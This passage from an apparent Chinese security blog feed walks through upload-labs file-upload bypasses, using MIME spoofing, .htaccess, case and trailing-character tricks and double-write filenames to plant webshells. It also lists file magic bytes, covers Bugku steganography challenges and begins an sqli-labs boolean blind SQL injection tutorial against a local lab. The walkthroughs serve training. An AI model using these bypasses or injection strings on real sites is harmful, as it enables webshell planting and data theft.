UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>发现这里采用的是后端验证文件类型, 但是他只过滤的文件类型, 并没有过滤文件后缀名, 所以可以上传 php文件，然后修改 content-type 绕过。<br>（可能会有小伙伴问，文件后缀名不就定义了我文件类型了吗，嗯…其实并不是，文件后缀只是决定了双击打开的方式，比如你用photoshop可以打开一个psd图像文件。把这个文件扩展名改为txt，再拖到photoshop窗口里，还是一样能打开，说明内容完全没有变化，变化的只是双击时的默认打开方式。）</p><p>可以看到这题的提示：<br><img src="http://img-blog.csdnimg.cn/20190805160817285.png" alt="在这里插入图片描述"><br>关于MIME我这里要说一下（百度百科<strong>是错的</strong>哦）：</p><blockquote><ul><li>它全名叫多用途互联网邮件扩展（Multipurpose Internet MailExtensions），最初是为了将纯文本格式的电子邮件扩展到可以支持多种信息格式而定制的。后来被应用到多种协议里，包括我们常用的HTTP协议。</li><li><strong>MIME的常见形式是一个主类型加一个子类型，用斜线分隔。比如text/html、application/javascript、image/png等</strong>。</li><li>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。</li></ul></blockquote><p>这里采用的判断方式就是MIME后端验证！<br>这里有两种绕过方法：↓</p><blockquote><p>PS：</p><ul><li>上传php文件时，Content-Type的值是application/octet-stream；</li><li>上传jpg文件时，Content-Type的值是image/jpeg</li></ul></blockquote><ol><li><p>如果服务器通过Content-Type的值判断文件类型，直接上传php文件(webshell)，抓包，将Content-Type的值修改为image/jpeg，即可上传php文件(webshell)。<br><img src="http://img-blog.csdnimg.cn/20190805170542903.jpg" alt="在这里插入图片描述"></p></li><li><p>先上传修改后缀名的webshell（webshell.php改为websshell.jpg）进行、抓包修改，后缀名改为webshell.php<br><img src="http://img-blog.csdnimg.cn/20190805170131135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后菜刀连接就行了<code>~(￣▽￣)~*</code></p></li></ol><p><strong>Less-3</strong></p><p>第三题又是一个新类型的题：<strong>黑名单限制文件上传</strong>，不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。那么要如何绕过呢？<br>这里说下关于Apache的一些知识：</p><ul><li>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</li><li>可以上传例如<code>php3, phtml</code>后缀的文件绕过，前提是<strong>Apache</strong>的<strong>httpd.conf</strong>中配置有如下代码:<br><code>AddType application/x-httpd-php .php .php3 .phtml</code></li></ul><p>服务器会将<code>.php3, .phtml</code>后缀的文件当成<code>.php</code>解析。</p><p>步骤：<br>先找到<strong>Apache</strong>下的<strong>httpd.conf</strong>文件，然后查找“AddType text/html”，然后在这行代码后面，加上一行<code>AddType application/x-httpd-php .php .php3 .phtml</code>即可<br><img src="http://img-blog.csdnimg.cn/20190805234419319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接上传后缀名为<code>.phtml</code>的webshell文件，注意这里上传的文件名会改变<br><img src="http://img-blog.csdnimg.cn/20190805234628997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接菜刀<br><img src="http://img-blog.csdnimg.cn/20190805234742624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功（￣︶￣）↗　<br><img src="http://img-blog.csdnimg.cn/20190805235002925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下一题<br><strong>Less-4</strong><br>同样是黑名单过滤，直接看源码吧：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件不允许上传!&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>这题很绝，基本上把那些花里胡哨的后缀都过滤了，但是没有包括<code>.htaccess</code>，可以利用配合Apache的<code>.htaccess</code>文件上传 解析漏洞。</p><blockquote><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。</p></blockquote><p>　<strong>启用<code>.htaccess</code>**：<br>　需要修改<code>httpd.conf</code>文件下的配置，查找关键词<code>AllowOverride</code>，将后面的</strong>None<strong>改成</strong>All**<br><img src="http://img-blog.csdnimg.cn/20190806180051350.png" alt="在这里插入图片描述"></p><p>然后，上传一个<code>.htaccess</code>内容如下的文件（抓包时删去文件名）:</p><pre><code>SetHandler application/x-httpd-php</code></pre><p><img src="http://img-blog.csdnimg.cn/20190806180857300.png" alt="在这里插入图片描述"><br>这样所有文件都会解析为php，然后再上传图片马（我的菜刀好像有问题，就上传图片马吧），就可以解析：</p><p>图片马语句：<code>&lt;?php phpinfo(); ?&gt;</code><br><img src="http://img-blog.csdnimg.cn/2019080618233148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析，下一关</p><p><strong>Less-5</strong></p><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用<strong>大小写绕过</strong>。<br>上传文件<code>webshell.Php</code>，<br><img src="http://img-blog.csdnimg.cn/20190806184907184.png" alt="在这里插入图片描述"><br>上传成功。可以发现文件名又改变了，连接菜刀时要注意哦<br><img src="http://img-blog.csdnimg.cn/2019080619020413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功</p><p><strong>Less-6</strong><br>查看源码发现还是黑名单，但是这关没有对后缀名进行去空格处理，可在后缀名中加空格绕过</p><pre><code> if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></pre><p>上传的<code>.php</code>文件 抓包加上空格就行了。<br><img src="http://img-blog.csdnimg.cn/20190808150945133.png" alt="在这里插入图片描述"><br>上传成功，查看文件命及路径<br><img src="https://img-blog.csdnimg.cn/20190808151244363.png" alt="在这里插入图片描述"><br>菜刀连接，成功。</p><p><strong>Less-7</strong><br>还是黑名单，但是没有对后缀名进行去<code>.</code>处理，，可在后缀名中加<code>.</code>绕过  ；上传后windows下会自动去掉后缀名中最后的<code>.</code><br><img src="http://img-blog.csdnimg.cn/20190808153824918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>菜刀连接，成功。</p><p><strong>Less-8</strong><br> 黑名单绕过，对比Less-4可以发现Less8少了这一句；<br><img src="http://img-blog.csdnimg.cn/20190808165531516.png" alt="在这里插入图片描述"><br>在php+windows的情况下：如果文件名+<code>::$DATA</code>,<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名 且保持”<code>::$DATA</code>“之前的文件名。（原因的话不清楚）<br>所以这题的绕过方法为：在文件后缀加<code>::$DATA</code><br>抓包，加上后缀就行了。<br><img src="http://img-blog.csdnimg.cn/20190808165952354.png" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-9</strong></p><p>我们先来看下Less2的路径拼接代码：</p><pre><code>   if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                    $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                    $is_upload = true;</code></pre><p>再看这一关的代码拼接，</p><pre><code>  if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name;                $is_upload = true;            &#125;</code></pre><p>发现5，6，7，8，9关都是一样，路径拼接的是处理后的文件名，导致可以利用类似<code>.php. .</code>(两个点号之间有一个空格)绕过<br>程序先是删除一个点，再删除一个空格经过处理后，文件名变成<code>.php.</code>，即可绕过。<br><img src="http://img-blog.csdnimg.cn/2019080818171377.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190808181823973.png" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-10</strong><br>依旧是黑名单过滤，查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>注意到，这里是将文件后缀名替换为空，于是可以利用双写绕过(不懂的话，百度下<code>str_ireplace</code>这个函数)：</p><pre><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190808190553694.png" alt="在这里插入图片描述"><br>成功上传。<br><img src="http://img-blog.csdnimg.cn/20190808190700260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr>这次就先总结到这吧，一次不想写太长，后面会补上；觉的我总结的还行的话 求关注呦╰(￣ω￣ｏ)]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的16进制文件头</title>
      <link href="2019/08/02/%E5%B8%B8%E8%A7%81%E7%9A%8416%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
      <url>2019/08/02/%E5%B8%B8%E8%A7%81%E7%9A%8416%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<p>PNG (png)，文件头：89504E47<br>JPEG (jpg)，文件头：FFD8FF<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku杂项(三)</title>
      <link href="2019/08/01/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2019/08/01/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这周接着扳bugku上的题，话说暑假真的好无聊啊╯︿╰，希望赶紧开学。。。<hr><br><strong>1、旋转跳跃</strong><br><img src="http://img-blog.csdnimg.cn/20190730164612158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题没啥难度，就是考会不会用<strong>MP3Stego</strong>这个工具；放个福利吧，为了让更多的小白免受找工具之苦 下载地址：<a href="http://www.petitcolas.net/fabien/software/">http://www.petitcolas.net/fabien/software/</a><br><strong>常用命令：</strong></p><blockquote><p>加密：-X -P 123456 test.mp3  （123456 是密码，test.mp3待解密文件）<br> 加密：-E hidden.txt  -P 123456 test.mp3 （ hidden.txt 是隐藏文档，123456是密码 test.mp3待加密文件）</p></blockquote><p>开始做题，这题已经给了提示密文：<code>syclovergeek</code> 等会解密会用到，先把这题要分析的文件放进<code>MP3Stego</code>文件目录下，可以在<code>MP3Stego</code>的目录下打开Powershell窗口（ps：这里我在<code>MP3Stego</code>的目录下直接<code>get base here</code> 显示无法找到文件，不知道为啥）<br><img src="http://img-blog.csdnimg.cn/2019073018001427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接把<code>decode.exe</code>文件拖进黑框界面里 然后输入 <code>-X -P 密码 文件名</code><br><img src="http://img-blog.csdnimg.cn/20190730180141177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密成功<br><img src="http://img-blog.csdnimg.cn/20190730180204398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开txt文档 得到flag<br><img src="http://img-blog.csdnimg.cn/20190730180401502.png" alt="在这里插入图片描述"><br><strong>2、论剑</strong><br><img src="http://img-blog.csdnimg.cn/20190730221305476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题也挺有意思的，下载文件打开是张图：<br><img src="http://img-blog.csdnimg.cn/20190731170714189.jpg" alt="在这里插入图片描述"><br>老套路，先右键查看详细信息， Stegsolve里看下，没啥信息；再WinHex里查看下，发现一串二进制数<br><img src="http://img-blog.csdnimg.cn/20190731171453940.png" alt="在这里插入图片描述"><br>8个一组转成ASCII码值，得到<code>mynameiskey!!!hhh</code>   先留着肯定有用；binwalk里跑一波 ，也没啥东西<br><img src="http://img-blog.csdnimg.cn/20190731210932937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>去修改下文件宽高看看， 右键查看详细信息<br><img src="http://img-blog.csdnimg.cn/20190731211304882.png" alt="在这里插入图片描述"><br>JPG图片<code>FFC2</code>后面三个字节即为高与宽（注意是高与宽哦），然后再winhex里<strong>Ctrl+Alt+x</strong> 搜索16进制文件找到<code>FFC2</code>（小白提醒，搜索的时候要大写字母）<br><img src="https://img-blog.csdnimg.cn/20190731222234592.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190731222655375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将781转换为16进制为<code>030D</code>，66转换为16进制为<code>42</code>，找到后把0042改为030D保存打开<br><img src="http://img-blog.csdnimg.cn/20190731222850211.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emm… 发现有些地方被遮住了，继续找吧，肯定还有线索；无奈看了下别人的blog，才知道那串二进制后面的数值是7Z文件的文件头，不过要修复下<br><img src="http://img-blog.csdnimg.cn/20190731230519799.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019073123041266.png" alt="在这里插入图片描述"><br>将38改为37 7B改成7A，保存，在用binwalk跑一波，发现果然有了个压缩包<br><img src="http://img-blog.csdnimg.cn/20190731231218431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dd命令分离<br><img src="http://img-blog.csdnimg.cn/20190731231736435.png" alt="在这里插入图片描述"><br>打开是一张加密的图，那先前解出来应该就是密码，输入密码，成功打开<br><img src="http://img-blog.csdnimg.cn/20190731231744452.jpg" alt="在这里插入图片描述">再次更改高度查看，得到：<br><img src="http://img-blog.csdnimg.cn/20190731231857871.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>合在一起为<code>f666C61677B6D795F6E616D655F482121487D</code> 目测为base16 解码得：<code>flag&#123;my_name_H!!H&#125;</code>，啊，好累啊，写完睡觉。。。</p><p><strong>3、图穷匕见</strong><br><img src="http://img-blog.csdnimg.cn/20190801192229654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载打开是张图，先看下详细信息，发现了这个：<br><img src="http://img-blog.csdnimg.cn/20190801192339178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>画图题？，接着放进winhex里查看，这里可以看到有很多16进制数。把他们复制下来（全选然后双击）<br><img src="http://img-blog.csdnimg.cn/20190801195504794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再notepad++里hex→ascii<br><img src="http://img-blog.csdnimg.cn/20190801200007455.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到一串坐标，之后就好办了，把括号和逗号替换掉，保存。<img src="http://img-blog.csdnimg.cn/20190801200233616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另存为txt文件，接下来使用一个画图工具：gnuplot（自己百度吧 下载地址很多的）把txt文件拖进bin目录下，然后执行命令：<br>plot”文件名.txt”</p><p><img src="http://img-blog.csdnimg.cn/20190801200402664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车：</p><p><img src="http://img-blog.csdnimg.cn/20190801200446697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描二维码得到<code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs闯关 Bool盲注详解!（Less-8）</title>
      <link href="2019/07/29/Sqli-labs%E9%97%AF%E5%85%B3%20Bool%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%EF%BC%88Less-8%EF%BC%89/"/>
      <url>2019/07/29/Sqli-labs%E9%97%AF%E5%85%B3%20Bool%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%EF%BC%88Less-8%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>   前篇write up介绍了Less8的上传木马，连接菜刀的做法；那这次记录下这题关于盲注的做法；先来简单介绍下盲注。</p><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注主要分为三类</p><blockquote><p>•基于布尔 SQL 盲注<br>•基于时间的 SQL 盲注<br>•基于报错的 SQL 盲注</p></blockquote><p> 那这题呢就先介绍下使用bool型盲注吧。（也可以用时间的盲注，报错注入是不行的，因为报错信息被注释了）<br><img src="http://img-blog.csdnimg.cn/20190729142641495.png" alt="在这里插入图片描述"><br>先了解下盲注常用的几个函数：</p><ul><li>database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</li><li>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。</li><li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</li><li>length()函数可返回字符串的长度</li><li>Ascii()将某个字符转换为 ascii 值</li><li>char()函数可将ASCII码转换为对应的字符</li></ul><p>好，知道了这些就去实战试试吧。</p><p><strong>Less-8</strong> 布尔型单引号GET盲注<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示了为单引号注入，测试下<br><img src="http://img-blog.csdnimg.cn/20190729160005474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，加上注释符回显正常，闭合方式确实是<code>&#39;</code><br>1）利用 left(database(),1)进行尝试</p><pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39; and left(version(),1)=5 %23</code></pre><p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，显然 返回的结果是正确的。<br><img src="http://img-blog.csdnimg.cn/20190729162211883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2）接下来看一下数据库的长度<br>    